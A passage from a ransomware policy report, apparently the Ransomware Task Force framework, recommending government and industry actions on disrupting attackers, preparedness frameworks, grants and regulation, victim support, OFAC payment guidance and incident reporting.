information.\n\nData sharing at the consortium should also accelerate the maturation of best practices and sustainability of the \ncyber insurance market, as this data enables further risk modeling and underwriting analysis. This consortium \nshould improve risk management and resolution strategies so that ransomware is less frequent, less destructive, \nand less profitable for the threat actors. It should also enable insurers and reinsurers to establish certainty with \nlaw enforcement and regulators such as OFAC as to the legality of any payment and as with respect to sanctions. \nFinally, the consortium may serve as the home of any common subrogation “war chest” fund for collaboration, \nas described in Action 2.1.5. This consortium should also work directly with the JRTF and RTFH as described in \nactions 1.2.2 and 1.2.3. \n\nTiming: 6-12 months (to establish consortium and initial subrogation effort).  \nLead: Domestic and international insurance and reinsurance firms.\n\nObjective 2.2:  \nTarget the infrastructure used by ransomware criminals \n\nRansomware actors rely on infrastructure to carry out their attacks, including servers and \nnetworks that serve as “command and control” for their attacks. Law enforcement agencies \nhave opportunities to disrupt ransomware criminals by targeting this infrastructure.\n\nAction 2.2.1: Leverage the global network of ransomware investigation hubs. \n\nThe global network of ransomware investigative hubs recommended in Action 1.1.3 (and utilized by the coalition \nrecommended in 1.1.2 and the JRTF recommended in Action 1.2.2), including leveraging cyber assistant legal \nattachés (ALATs) and ICHIP prosecutors, should have access to specialists that are empowered to focus efforts \n\nA Comprehensive Framework for Action: Goal #2\n\n\n\nIST 33Combating Ransomware\n\non infrastructure aimed at the “left of boom” elements of the criminal business model. This includes, among other \nareas, credential theft or other unauthorized access; malware distribution, including the use of malicious domains \nand criminal and abusive command and controls; criminal surveillance; and theft of intellectual property. \n\nTiming: 6-12 months.\t Lead: U.S. Federal Government and international equivalents. \n\nAction 2.2.2: Clarify lawful defensive measures that private-sector actors can take when countering \nransomware.\n\nCurrently, private-industry companies — including but not limited to hosting companies, internet service providers, \nand telecommunications companies — are actively working with law enforcement and other industry partners to \ndisrupt infrastructure associated with ransomware actors. This infrastructure may include malicious servers used \nto facilitate or conduct attacks against victims. If a service provider is tipped to malicious infrastructure, it should \nbe able to take action against the infrastructure without fear of legal liability. For example, if a hosting company is \nmade aware that a customer is conducting attacks from one of the hosting company’s servers, they can typically \nshut down the customer’s service due to a violation of the company’s terms of service. In a less clear scenario,  \nif a telecommunications company is provided a signature that identifies malicious network traffic and they block \nthe traffic from transiting their network, thereby disrupting the malicious activity, the company may have some \nlegal liability. \n\nCongress should ensure private industry can actively block or limit traffic when acting in good faith without \nfear of legal liability. Specifically, Congress should modernize the Computer Fraud and Abuse Act (CFAA) and \nother cybersecurity laws to take into account activities that cybersecurity companies, security researchers, \nservice providers, and other responsible parties are currently doing “at risk” in gray areas in order to protect their \ncustomers. \n\nTo be clear, this is not advocating for “hacking back,” rather it is focused on decriminalizing practical security \nactivities necessary to counter modern cybersecurity threats, including against criminal infrastructure like botnets \nused in ransomware. \n\nTiming: 12 to 24 months. \tLead: U.S. Congress and international equivalents.\n\nObjective 2.3:  \nDisrupt the threat actors, including ransomware developers, criminal affiliates,  \nand ransomware variants\n\nAction 2.3.1: Increase government sharing of ransomware intelligence. \n\nThe government should increase the sharing of intelligence about ransomware actors with the private and \nnonprofit sectors, including key data points that specifically lead back to the threat actors. Such information \ncould include threat actor personas, tradecraft, and attribution (including roles and responsibilities); behavioral \ntactics and techniques; and related technical information (i.e., indicators of compromise). Making such \nintelligence more broadly available would enable the private sector to protect itself more effectively; better \n\nA Comprehensive Framework for Action: Goal #2\n\n\n\nIST 34Combating Ransomware\n\ncoordinate with government entities, such as the JRTF and RTFH in Action 1.2.2; and support governments in \ndisrupting ransomware activity. \n\nTiming: 6 months and ongoing. \t\tLead: Department of Homeland Security and international equivalents.\n\nAction 2.3.2: Create target decks of ransomware developers, criminal affiliates, and ransomware \nvariants. \n\nTo better operationalize and focus resources, the U.S. Government and the security community should work \ntogether to create prioritized target decks for ransomware developers, criminal affiliates, and ransomware variants \nbased on how much harm they are doing and the breadth of their operations. The core of this effort must focus \non unveiling the threat actors themselves and understanding their organization(s), with the goal of identifying \nvulnerabilities that can be exploited to disrupt the threat, using all capabilities available to the private industry and \ngovernments. This effort should include working more closely with the security community on a routine basis to \nshare information and coordinate operations, to be facilitated by the JRTF and RTFH described in Action 1.2.2. \n\nTiming: 6 to 12 months. \t\t  Lead: U.S. Federal Government and international equivalents.\n\nAction 2.3.3: Apply strategies for combating organized crime syndicates to counter ransomware \ndevelopers, criminal affiliates, and supporting payment distribution infrastructure. \n\nRansomware events are not singular, but part of an ongoing campaign of extortion against government and \nprivate-sector entities. Kill-chain analyses of ransomware organizations reveal a complex network of associates \nand entities. These organizations have been established to function as an extortion operation with repeatable \noutcomes. The various components of the organization include creators of malware, establishment of \nransomware affiliates, franchise fees or percentage of ransomware payouts to the operation leaders, digital wallet \ncreation, money laundering, using money mules, and more. \n\nLaw enforcement should disrupt the ransomware criminal enterprise by using established frameworks that \nhave been applied successfully to disrupt the activities of the mafia and other criminal organizations. The U.S. \ngovernment should leverage the power of the RICO statute, as called for above in Action 1.2.4, to prosecute \nransomware criminals. The RICO statute (Title 18 USCS § 1962) serves as a “mafia business tax”, and prohibits \nracketeering. RICO investigations provide influential tools to inspire cooperation of members and supporters of \na criminal enterprise, such as enhanced prison terms for any conspirators, and forfeiture and exposure to civil \nRICO investigations. If deemed necessary, the federal government should undertake immediate action to ensure \nransomware crimes are predicates for use of the RICO statutes. \n\nTiming: 12 to 24 months. \t\t Lead: U.S. Law Enforcement and international equivalents.\n\nA Comprehensive Framework for Action: Goal #2\n\n\n\nIST 35Combating Ransomware\n\nAction 3.1.1: Develop a clear, actionable framework for ransomware mitigation, response, and recovery.\n\nAlthough multiple organizations have published ransomware guides, no single, authoritative source of best practices \nexists. The current state of awareness around ransomware is similar to the general environment prior to 2014, when \nno compilation of best practices existed for cybersecurity. At that time, the U.S. National Institute of Standards and \nTechnology (NIST) led a multi-stakeholder process to develop the Framework for Improving Critical Infrastructure \nCybersecurity. This framework has been widely adopted by organizations around the world and serves as a foundational \ncybersecurity risk management resource. \n\nWe have reached a similar point with the ransomware threat. The single most impactful measure that could be \ntaken to help organizations prepare for and respond to ransomware attacks would be to create one internationally \naccepted framework that lays out clear, actionable steps to defend against, and recover from, ransomware. \n\nHelp organizations prepare for  \nransomware attacks\n\nGoal #3\n\nAny organization can fall victim to ransomware, creating catastrophic disruption for the \norganization and those it serves. Yet despite extensive press coverage and content on this \ntopic, the threat is poorly understood by many public- and private-sector leaders, and the \nmajority of organizations lack an appropriate level of preparedness to defend against these \nattacks. Even firms that have invested in cybersecurity broadly may be unaware of how to \nprepare for, and defend specifically against, ransomware attacks, and information available is in \nmany cases oversimplified or excessively complicated. \n\nThe challenge is to increase awareness and build defenses that will be effective both at scale \nand over time as the threat evolves. To do this, governments and industry leaders need to better \nconnect with key audiences, including both the organizational leaders who need to understand \nthat ransomware is a real and relevant threat to their organization, and also the individuals \nin operational roles (such as IT and security professionals) who need guidance on how to \nprioritize mitigation efforts given limited resources. Support should be customized based \non each organization’s current situation, including to what extent it is already appropriately \ninformed and whether it has appropriately invested in time and resources.\n\nGuides and technological tools to mitigate ransomware are currently available; however, \nmany are insufficient, overly simplified, or too complicated, and the general level of noise \nsurrounding this problem is confusing and problematic.\n\nObjective 3.1:  \nSupport organizations with developing practical operational capabilities\n\nA Comprehensive Framework for Action: Goal #3\n\n\n\nIST 36Combating Ransomware\n\nRansomware is a global problem, so governments and private-sector organizations around the world should collaborate \non this effort to ensure the framework will work internationally. Efforts taken only in one jurisdiction may be regionally \neffective, but will likely push attackers to focus on different regions; a coordinated international effort will create greater \nlong-term impact and more effectively disrupt the economics of the cybercrime market. It will also drive greater \nadoption in organizations that operate in more than one country.\n\nAs far as is practical, the framework should be consistent with existing cybersecurity frameworks, such as International \nStandards Organization publications59 and the NIST Cybersecurity Framework,60 but it should be specific to \nransomware. It should build on the work that NIST’s National Cybersecurity Center of Excellence has already done as \npart of the data integrity project and related papers. The framework should clearly identify each recommended action’s \nimpact, as well as the required investment of time and other resources. It should include multiple layers for different \naudiences; similar to the NIST Cybersecurity Framework, the top layer would be intended for executive decision makers, \nthe second and third layers for operational managers, and the fourth layer for front-line implementers. \n\nThe ransomware-specific framework should also identify what approaches are most successful in dealing with \nransomware and why. The framework should identify what constitutes a reasonable due diligence review prior to \npayment, consistent with actions 4.1.1 and 4.1.2, which address the creation of ransomware emergency response \nauthorities and a ransomware response fund. \n\nIn addition, industry-specific profiles should be developed to tailor the Ransomware Framework to different industries or \nsectors. Creating different profiles for local governments, small- and medium-sized businesses, and large enterprises, \nfor example, would enable different types of organizations to adapt the framework to their particular situations. \n\nTiming: 12-24 months, and updated yearly thereafter.  \nLead: NIST for the US, and international equivalents, with private-sector participation.\n\nAction 3.1.2:  \nDevelop complementary materials to support widespread adoption of the Ransomware Framework. \n\nAdditional materials should be developed to accompany the ransomware prevention framework, drawing from \nexisting resources, to further articulate how organizations can leverage specific security capabilities, technologies, \nand policies to meet the frameworks’ identified best practices. Such materials could include: \n\n•\t Detailed deployment toolkits and guides to assist specific sectors or market segments with applying  \nthe framework; \n\n•\t Mappings to existing popular cybersecurity frameworks, e.g. NIST, ISOs, CIS controls\n•\t A ransomware-specific risk assessment tool; \n•\t Ransomware reference architectures (such as those developed by NIST’s National Cybersecurity  \n\nCenter of Excellence); \n•\t A ransomware killchain; \n•\t A checklist to help organizations to hold managed service providers (MSPs) and IT vendors accountable. \n\nTiming: 12-24 months, and updated regularly thereafter. \t Lead: �NIST for the US, and other international \nequivalents.\n\nA Comprehensive Framework for Action: Goal #3\n\n\n\nIST 37Combating Ransomware\n\nAction 3.1.3: Highlight available internet resources to decrease confusion and complexity. \n\nMany decision aids exist to aid organizations preparing for, and responding to, ransomware attacks. While this \nvolume of content is designed to help, it can in fact hinder preparedness or response as organizations struggle \nto identify the most relevant and actionable guidance for their situation. It is challenging for organizations to \ndetermine which guides can be trusted to provide high-quality, accurate advice. To address these shortcomings, \nthe Task Force recommends a two-pronged approach. \n\nFirst, internet search companies could take steps to make sorting through online materials easier. For example, \nduring the COVID-19 pandemic, internet search companies took steps to highlight credible content related to the \npandemic to make it easier to find the most up-to-date and relevant information, and also to minimize the negative \nimpact of mis- or disinformation. A similar effort focused on ransomware would help IT and security professionals \nnavigate this highly complex and evolving threat landscape, and quickly identify the most important information \nand guidance. Once the Ransomware Framework and complementary materials are published, these would be \nprioritized on these search pages. \n\nSecond, a nonprofit entity, such as the Cybercrime Support Network, should collect and maintain a reference \nlibrary of decision aids and best practice guides for responding to a ransomware attack. This step would provide a \nvetted library of material for organizations to draw on to prepare for and/or respond to a ransomware attack.\n\nTiming: 6-12 months for first iteration, and ongoing thereafter.  \nLead: For curation, internet search companies. For aggregation, a nonprofit like the Cybercrime Support  \nNetwork (CSN) could lead this process in the U.S., together with international partners.\n\nThere is a stark difference between being aware of ransomware as a threat and having \na real understanding of the dynamics, mitigations, and potential impacts of an attack. \nOrganizational leaders need greater understanding about the significance and relevance of \nthe ransomware threat in order to allocate resources and prioritize focus. \n\nAction 3.2.1: Develop business-level materials oriented toward organizational leaders. \n\nOrganizational leaders traditionally see security as niche and highly technical. They need to understand \nransomware as a whole-organization event, in non-technical, business risk-relevant terms. While the Ransomware \nFramework described in Action 3.1.1 has a top layer aimed at executives, additional materials should highlight \nbusiness needs and risks, and aim toward educating organizational leaders about the threat. \n\nThese materials should include a simplified and translated overview of the framework; a ransomware primer \nfor business leaders; or a checklist for organizational leaders to address with operational staff. They could also \ninclude detailed case studies of real, anonymized attacks related to critical sectors, highlighting how ransomware \nattacks occurred and the resulting business impact. Any materials should also consider the regulatory landscape, \n\nObjective 3.2:  \nIncrease knowledge and prioritization among organizational leaders\n\nA Comprehensive Framework for Action: Goal #3\n\n\n\nIST 38Combating Ransomware\n\nemphasizing how adhering to preparatory frameworks \ncan reduce the likelihood of fines or other penalties.\n\nTiming: 6-12 months, with updates yearly as needed.  \nLead: CISA or equivalent international government \nagency tasked with capacity-building around \ncybersecurity. \n\nAction 3.2.2: Run nationwide, government-\nbacked awareness campaigns and tabletop \nexercises.\n\nA government-backed awareness campaign will not \nonly help raise the profile of ransomware as a serious \nbusiness issue, but it will also increase the credibility \nand need for focus among busy organizational leaders. \nThis should be coordinated with efforts addressing \noperational technical roles. Such a campaign should \nleverage appropriate international organizations, state \nand local governmental entities, non-profits, and \nindustry organizations and influencers. It should also \nbe accompanied by tabletop exercises that provide \nopportunities for learning and collaboration.\n\nAdditionally, as many organizational leaders rely \non trade or local business networks to learn about \nchallenges facing organizations in their sector or \nregion, we recommend engaging these organizations \nin awareness campaigns. In the United States, \norganizations that could be considered include \nChambers of Commerce, the National Association \nof Corporate Directors, the Young Presidents’ \nOrganization, and various trade associations. These \norganizations may need funding in order to be able to \ntake on a campaign of this significance. \n\nTiming: 12-24 months years, and ongoing for as  \nlong as relevant.  \nLead: U.S. Federal government and international \nequivalents, appropriate agency leads (e.g.,  \nEducation or Homeland Security or equivalents),  \nand key nonprofit partners.\n\nAs part of an awareness-building campaign, \nnational governments could lead multi-\nstakeholder “tabletop exercises” for states, cities, \nbusinesses, and international partners. Tabletop \nexercises bring together key stakeholders to use \nscenarios or simulations of ransomware events, \nand could help organizations hone internal and \nexternal organizational collaboration and response \nprocesses. Such exercises are valuable in helping \norganizations understand the importance of \nprioritizing ransomware preparedness, as well \nas their personal risks and responsibilities as \npart of a globally interconnected system. Regular \nexercises can also help build strong relationships \nand facilitate more robust ransomware threat \ninformation-sharing and incident response \ncollaboration. As an example, the U.S. Department \nof Homeland Security conducts a bi-annual \nnational cyber exercise called Cyber Storm.\n\nTabletop Exercises\n\nIncreasing security in a few key areas could \nmake a significant difference for organizations \nin their effort to prepare for ransomware attacks. \nComplex security software or complete network \nrebuilds may not be necessary. For example, \nas SecurityScorecard notes in a recent report, \nimplementing multi-factor authentication or \nadopting password managers can dramatically \nimprove an organization’s security posture.61 \n\nAlthough any organization, regardless of its \nsecurity, can be a target for a ransomware attack, \nimproving baseline security and raising awareness \namong employees can go far in protecting \norganizations from attack. \n\nA Little Goes a Long Way\n\nA Comprehensive Framework for Action: Goal #3\n\n\n\nIST 39Combating Ransomware\n\nAction 3.3.1: Update cyber-hygiene regulations and standards.\n\nExisting cybersecurity regulations — such as the Health Insurance Portability and Accountability Act (HIPAA) in \nthe United States, and the Directive on Security of Network and Information Systems (NIS) in the European Union, \nas well as non-regulatory standards such as the Payment Card Industry Data Security Standard (PCI DSS) — all \nset a baseline for cybersecurity in specific regulated sectors where protection of data and essential services \nis considered critical. Though some targeted guidance exists,62 many standards do not specifically address \nransomware, despite the significance of this threat. These and other existing cybersecurity regulations and \nstandards should thus be reviewed and, where necessary, updated to incorporate measures that align with the \nrecommended Ransomware Framework (see Action 3.1.1) to more directly mitigate ransomware attacks\n\nTiming: Dependent on the creation of the Ransomware Framework (Action 3.1.1); likely 12-24 months, with \nsubsequent iterations in the long term (24+ months).  \nLead: State and federal government(s) or equivalent law-making bodies, with support from state/local entities, \nthink tanks, and nonprofits.\n\nAction 3.3.2: Require local governments to adopt limited baseline security measures.\n\nRansomware attacks impacting local governments are catastrophic not only for the organizations themselves, but also \nfor the constituents they serve. Mandating certain behaviors and practices will help local governments better defend \nagainst attacks, and may help them provide enhanced support for small-to-medium-sized businesses operating in \ntheir jurisdiction. In the United States, required measures could include:\n\n•\t Joining the Multi-State Information Sharing and Analysis Center (MS-ISAC);\n•\t Signing up for the MS-ISAC’s Malicious Domain Blocking and Reporting (MDBR),63 unless already running a \n\ncomparable DNS filtering service; and\n•\t Signing up for CISA’s infrastructure and web application scanning services.64\n\nOther measures could include the MS-ISAC offering ransomware-specific training and support to cities, though \nany additional requirements would likely require funding or financial incentives. \n\nRegulations and standards related to cybersecurity vary widely, and in most cases do not \nspecifically address ransomware. Updating regulations and filling gaps with new regulations \nwill help drive better adoption of ransomware mitigations in core regulated sectors.\n\nFor the new regulations proposed below, the government may want to consider a \nmechanism to address how quickly the technology and threat landscapes evolve, compared \nto the process for updating laws and regulations. For example, a private- or public-sector \nstandards body (e.g. NIST, the Center for Internet Security, or a group similar to the Payment \nCard Industry Security Council) could set and annually update minimum required standards, \nand the law would incorporate this group’s standards.\n\nObjective 3.3:  \nUpdate existing, or introduce new, cybersecurity regulations to address ransomware\n\nA Comprehensive Framework for Action: Goal #3\n\n\n\nIST 40Combating Ransomware\n\nMany organizations are under-invested in cybersecurity and resilience, and may lack the \nresources to manage the ransomware threat. By providing financial incentives, governments \ncan help the most vulnerable and resource-constrained organizations tackle this issue. For \nsome organizations, incentives may be the only means available to prepare for, and defend \nagainst, a ransomware attack.\n\nAction 3.4.1: Highlight ransomware as a priority in existing funding provisions.\n\nWhere grants or funding are already offered and may be used for cybersecurity activity, we recommend that the \naccompanying language should be updated to highlight ransomware preparedness as a priority for spending and focus.\n\nAccording to a Third Way paper on U.S. federal grants for cybersecurity,67 eight existing preparedness grants \nare available to state, local, tribal, and territorial (SLTT) governments, transportation authorities, nonprofits, and \nprivate entities through the Federal Emergency Management Agency (FEMA). These have recently been changed \nto allow recipients to spend funds on cybersecurity, as when FEMA identified cybersecurity as a “priority area” in \n2018 for the largest DHS preparedness grant, and required fund recipients to spend at least 5% of their funds on \ncybersecurity for critical infrastructure. This prioritization and funding expansion should continue across additional \ngrants and should specifically highlight ransomware preparedness as an urgent priority. \n\nTiming: 3-6 months. \t Lead: Relevant fund designation agencies.\n\nObjective 3.4:  \nFinancially incentivize adoption of ransomware mitigations\n\nA Comprehensive Framework for Action: Goal #3\n\nTiming: 6-12 months, and updated yearly thereafter. \nLead: U.S. Federal Government and international equivalents.\n\nAction 3.3.3:  \nRequire managed service providers to adopt and provide baseline security measures.\n\nManaged service providers (MSPs) often cover the IT and security functions for organizations that cannot invest in \nin-house expertise and technologies. MSPs do not commonly provide extensive security coverage or ransomware \nmitigations, but doing so would likely create widespread positive impact for small-to-medium-sized organizations. \nBaseline security measures for MSPs could include:\n\n•\t Adherence with a cyber-hygiene program (for example, CIS Controls Implementation Group 165 and the  \nNIST Cybersecurity Framework;66 \n\n•\t Mandatory disclosure across the MSP’s customer base if there is a ransomware incident involving the \nMSP’s service offering; and\n\n•\t Forming an MSP-ISAC, an information sharing and analysis center specific to this industry. \n\nNote that some funding or financial incentivization may initially be needed to help MSPs develop cybersecurity capabilities. \n\nTiming: 6-12 months. \t Lead: U.S. Congress and international equivalent lawmakers.\n\n\n\nIST 41Combating Ransomware\n\nAction 3.4.2: Expand Homeland Security Preparedness Grants to encompass cybersecurity threats.\n\nUnder current law, Homeland Security Preparedness Grants focus on terrorism. Given the threat that ransomware \nposes to U.S. state, local, tribal, and territorial government entities, expanding this grant program to encompass \ncybersecurity threats would provide tremendous benefits. In addition to making SLTTs more resilient to ransomware, \nthese investments will likely improve service delivery as upgrading software and hardware is often the most cost-\neffective security investment an organization can make. As noted in Action 3.4.3, access to these grants should be \nconditioned upon demonstrated alignment with the Ransomware Framework after it is developed. \n\nTiming: 6-12 months. \t Lead: Department of Homeland Security, working with Congress.\n\nAction 3.4.3: Offer local government, SLTTs, and critical NGOs conditional access to grant funding \nfor compliance with the Ransomware Framework.\n\nIn 2018, the U.S. Congress’s Help America Vote Act (HAVA) allocated grant funds to help states bolster their \nelection security. A similar model, through which states manage the delivery of grant funds to municipalities, \ncould be employed to provide grants as financial incentives for demonstrated alignment with the Ransomware \nFramework. This could help motivate U.S. State, Local, Tribal, and Territorial government entities (SLTTs) to better \nprepare for and defend themselves against a ransomware attack. Continued provision of such grants should be \nbased on clear measures of progress and advancement toward self-reliance. A similar model could be investigated \nfor suitability in other countries. \n\nTiming: Dependent on the creation of the Ransomware Framework in Action 3.1.1; likely 12-24 months.  \nLead: U.S. Federal government and international equivalents. \n\nAction 3.4.4: Alleviate fines for critical infrastructure entities that align with the Ransomware Framework.\n\nA recent amendment to the HITECH ACT68 requires the U.S. Department of Health and Human Services, when \nconsidering whether an entity should be fined for a HIPAA Security Rule-related violation, to consider the extent \nto which the entity has demonstrated alignment to an established risk management framework. A similar model \ncould apply to other regulated critical infrastructure sectors to strongly incentivize adherence to established risk \nmanagement frameworks for ransomware prevention. \n\nTiming: 12-24 months. \t Lead: U.S. Federal government and international equivalents.\n\nAction 3.4.5: Investigate tax breaks as an incentive for organizations to adopt secure IT services. \n\nGovernments should offer tax breaks or other financial incentives to businesses that meet certain baseline \nstandards for ransomware preparedness, as laid out in the Ransomware Framework under Action 3.1.1. Such a \nprogram should be structured to ensure long-term self-reliance. Leveraging tax breaks could help drive adoption of \nbest practices for preparation for ransomware attacks; however, there are many practical considerations around \nwho would qualify, whether the savings would offset costs, and how organizations would prove their qualification. \n\n.Timing: 24 months.  \nLead: U.S. Federal government and international equivalents.\n\nA Comprehensive Framework for Action: Goal #3\n\n\n\nIST 42Combating Ransomware\n\nAction 4.1.1: Create ransomware emergency response authorities.\n\nRansomware attacks that have widespread, disruptive effects across society often fall outside the scope of \ntraditional disaster response authorities. To address this gap, national governments should create special \nauthorities to mitigate the effects of ransomware attacks that have impacts beyond the affected organization. \nThe Cyberspace Solarium Commission recommended creating the authority to declare a “cyber disaster.”69 The \nRansomware Task Force supports this idea and recommends that it should explicitly cover ransomware incidents. \n\nA cyber-disaster authority would enable federal agencies to assist victim organizations and local governments, \nas well as make other resources available, such as incident response support and forensic analysis. Such actions \nshould be limited to dealing with the immediate crisis and not long-term, ongoing engagement. To enable such \n\nRansomware can severely disrupt an organization’s business operations, and remediation \nefforts can take a long time. The resulting revenue loss can prove untenable for many \ncompanies, and can be a major crisis for hospitals and other critical infrastructure. Further, \nfor many local governments and small- and medium-sized businesses, the cost of rebuilding \nnetworks to avoid paying the ransom is prohibitively expensive. A platform of support \nresources should be established and made available to help ransomware victims with the \nrecovery process. \n\nRespond to ransomware attacks  \nmore effectively\n\nGoal #4\n\nFor victim organizations, a ransomware attack can be a stressful, potentially existential event. \nCrucial decisions about how to respond — including whether to pay the ransom — must be \nmade under intense pressure. Facing the potential threat of losing their data permanently, \norganizations may make hurried decisions, particularly if they lack understanding about the \nramifications of paying a ransom or the full range of alternatives open to them. \n\nIn order to improve organizations’ ability to respond to ransomware attacks more effectively, \ngovernment and industry leaders should increase the resources and information available \nto ransomware victims. At the same time, governments should require organizations to take \ncertain actions before paying a ransom, including reporting the payment to the government. \nUltimately, increased support for ransomware victims, including improved awareness of legal \nrequirements prior to payment, will decrease the number of organizations that feel compelled \nor trapped into paying ransoms. \n\nObjective 4.1:  \nIncrease support for ransomware victims\n\nA Comprehensive Framework for Action: Goal #4\n\n\n\nIST 43Combating Ransomware\n\n“cyber disaster declarations,” Congress could choose to amend the primary law governing natural disaster \nresponse activities, typically referred to as the Stafford Act, to explicitly cover cyber incidents, or it could create a \nnew, separate authority. \n\nTiming: 12-24 months. \t Lead: U.S. Federal government, and international equivalents.\n\nAction 4.1.2: Create a Ransomware Response Fund to support victims in refusing to make \nransomware payments.\n\nWhile a company might determine that paying a ransom is economically rational, such a decision supports the \ncriminal enterprise and is rarely in the public interest. To enable more companies to bear the financial cost of \nremediation, national governments should create “Cyber Response and Recovery Funds” (CRRFs). In addition \nto other goals, a CRRF should cover restoring IT functionality for local governments, critical national functions, \nor other entities as they recover from a ransomware attack, particularly when those entities lack access to \nappropriate cyber insurance or when a cyber insurance policy does not cover the event. This approach would \nbe similar to the Terrorism Risk Insurance Program, which “provides for a transparent system of shared public \nand private compensation for certain insured losses resulting from a certified act of terrorism.”70 If such funding \nwere available for ransomware victims, then cost would play a smaller role in an organization’s decision about \nwhether to pay the ransom. As an incentive to invest in cybersecurity, governments could consider requiring the \norganization to cover some portion of the ransom as a “deductible.” Governments could also consider additional \nrequirements to access the fund, such as demonstrating use of the Ransomware Framework in Action 3.1.1, to \nraise organizations’ overall level of cybersecurity. \n\nTiming: 12-24 months. \t Lead: �U.S. Federal government in consultation with the insurance industry, and \ninternational equivalents. \n\nAction 4.1.3: Increase government resources available to help the private sector respond to \nransomware attacks. \n\nMany organizations will seek government assistance during a ransomware attack. In the United States, the \nTreasury Department’s guidance on ransomware payments essentially requires organizations to consult with \nthe Department if they want to pay the ransom. However, in many countries, agencies cannot fully meet their \nmandates with existing resources, nor is it always clear which agency has the responsibility or capability to \naddress an inquiry. \n\nTherefore, governments should increase funding for agencies to respond to ransomware-related inquiries so they \ncan meet demand, through a combination of additional staff and improved technology. In addition, in the U.S. \ncontext, the Department of Homeland Security’s CISA should consider providing a concierge or ombudsman service \nfor private-sector entities seeking guidance on ransomware-related questions. Under this approach, CISA would not \nbe responsible for interpreting another agency’s guidance, but it would direct the inquiry to the correct office within \nthe Federal government. This assistance would facilitate better decision-making within the private sector. \n\nFor example, the U.S. Treasury Department has indicated that ransom payments could violate sanctions against \ncertain individuals or organizations. Treasury’s guidance also indicates that organizations can be held strictly \nliable for such payments, which means they can be punished for sanctions violations, even if they were unaware \n\nA Comprehensive Framework for Action: Goal #4\n\n\n\nIST 44Combating Ransomware\n\nor unable to determine that the recipient is on a prohibited list. As a result, many organizations will want to know \nwhether a potential payment recipient is a sanctioned entity. Given the volume of potential ransomware payments, \nthe Treasury will likely need additional resources to meet demands from the private sector. Second, inquiries may \nnot initially go to the Treasury; CISA could ensure that inquiries it receives regarding Treasury guidance get routed \nto the correct office. \n\nTiming: 12-24 months. \t Lead: U.S. Federal government, and international equivalents.\n\nAction 4.1.4: Clarify United States Treasury guidance regarding ransomware payments. \n\nIn October 2020, the United States Treasury Department’s Office of Foreign Assets Control (OFAC) issued \nan advisory to companies providing services to ransomware victims. This advisory indicates that OFAC will \nconsider ransomware payments as a sanctions violation if the recipient is on the Specially Designated Nationals \nand Blocked Persons List (SDN List), another blocked person, or covered by comprehensive country or region \nembargoes. Additionally, the advisory states that a violation by a non-U.S. person that causes a U.S. person to \nviolate any sanctions, or U.S. persons facilitating actions of non-U.S. persons in an effort to avoid U.S. sanctions \nregulations, are also prohibited. Finally, the advisory notes that any penalties could be assessed under strict \nliability, which means even if an organization did not know that paying the recipient would constitute a sanctions \nviolation, they can still be held liable for the action.\n\nWhile this guidance may seem straightforward, Task Force members who have specifically worked within this \nregime made the point that identifying payment recipients can prove quite challenging, especially under the short \ntimelines of a ransomware attack. Even if an organization asks OFAC whether a particular recipient falls into a \nprohibited category or seeks a payment license, OFAC is not resourced to provide answers rapidly enough for a \ncompany facing tight extortion timelines. Experts have identified other unanswered questions with the advisory. \nWhile the Task Force supports Treasury’s goal of reducing payments to criminals and in particular to prohibited \nentities, the advisory does not provide sufficient detail to be effective in achieving this outcome. \n\nTherefore, the Task Force recommends that the U.S. Treasury Department issue additional clarifying guidance to \nsupplement this advisory. This clarifying guidance should address such issues as what constitutes due diligence \nin determining the payment recipient’s identity, the liability OFAC would assign to each stakeholder, the timeline \nand process for obtaining a payment license (should an organization choose to pursue that route), and to what \nextent OFAC would consider the harms to people serviced by a ransomware victim in determining whether to grant \na license, if required. Taking into consideration the OFAC Advisory, as well as the almost simultaneous Financial \nCrimes Enforcement Network (FinCEN) Advisory and the Department of Justice Framework issued in October \n2020, OFAC should coordinate with these government counterparts to ensure the clarification considers their \ngoals and incorporates them into OFAC’s response to this request for clarification. \n\nTiming: 6-12 months. \t Lead: �U.S. Treasury Department. During the update process, the Treasury Department should \nconsult with relevant industry, academia, civil society, and cybersecurity experts.\n\nA Comprehensive Framework for Action: Goal #4\n\n\n\nIST 45Combating Ransomware\n\nObjective 4.2:  \nIncrease the quality and volume of information about ransomware incidents\n\nWhile everyone agrees that ransomware is a significant problem, there is a lack of \nreliable, representative data about ransomware’s scope and scale. Further, information \nabout ongoing ransomware threats does not yet reach as much of the digital ecosystem \nas it should – to include both across sectors of private industry or within responsible \ngovernmental departments and agencies. Therefore, improving the quality and volume of \nransomware information would enable better deterrence, enhance preparedness, and inform \ndisruption activities. \n\nAction 4.2.1: Establish a Ransomware Incident Response Network (RIRN).\n\nTo increase the flow of ransomware information, a wide array of public and private organizations should formally \nagree to share such information rapidly and in standardized formats. To implement this action, the Task Force \nrecommends the creation of the Ransomware Incident Response Network (RIRN). The RIRN would serve several \nfunctions, including facilitating receipt and sharing of incident reports, directing organizations to ransomware \nincident response services, aggregating data, and sharing or issuing alerts about ongoing threats. Not all entities \nwithin the RIRN would participate in all RIRN functions. For example, some RIRN organizations might not accept \nindividual incident reports or conduct incident response activities, but they could refer inquiries to another RIRN \norganization that would. \n\nRIRN entities engaged in the receipt and sharing of specific incident reports would agree to receive and share \nreports using the standard format developed under 4.2.2; adopt a system of unique identifiers to avoid double-\ncounts while maintaining anonymity; and share the resulting information in an anonymized form with other \ncyber intelligence organizations and national governments in the network, including law enforcement. RIRN \norganizations would also agree to direct reporting entities to available public and private resources, including \nincident responders that could assist the entity through the ransomware attack. The RIRN should consider \nwhether to enable organizations to report anonymously, such that the receiving organization does not know the \nidentity of the submitter. \n\nOther RIRN functions could include sharing or issuing alerts about ransomware threats in non-technical language. \nSuch alerts would be designed to engage as broad an audience as possible and to prompt action to counter \nspecific threats. \n\nThe RIRN network should include non-profit organizations, such as the Cybercrime Support Network, Cyber \nReadiness Institute, Global Resilience Institute, Global Cyber Alliance, Information Sharing and Analysis \nOrganizations, and Cyber Threat Alliance; for-profit entities, including cybersecurity vendors, insurance providers, \nand incident responders; and national government agencies, including law enforcement. \n\nTiming: 12-24 months to reach full operational capability. \t Lead: A nonprofit and international equivalents.\n\nA Comprehensive Framework for Action: Goal #4\n\n\n\nIST 46Combating Ransomware\n\nAction 4.2.2: Create a standard format for ransomware incident reporting.\n\nDifferent organizations require different types of information about ransomware attacks to serve a variety of goals. \nCybersecurity providers need technical data about the malware used in the attack to build protections for other \ncustomers, while law enforcement may be interested in other information, such as the wallet number and ransom \nnote. At the same time, reporting can be a significant burden to an organization suffering a ransomware attack. \n\nIn order to reduce the burden of ransomware reporting while increasing its utility for recipients, a standard 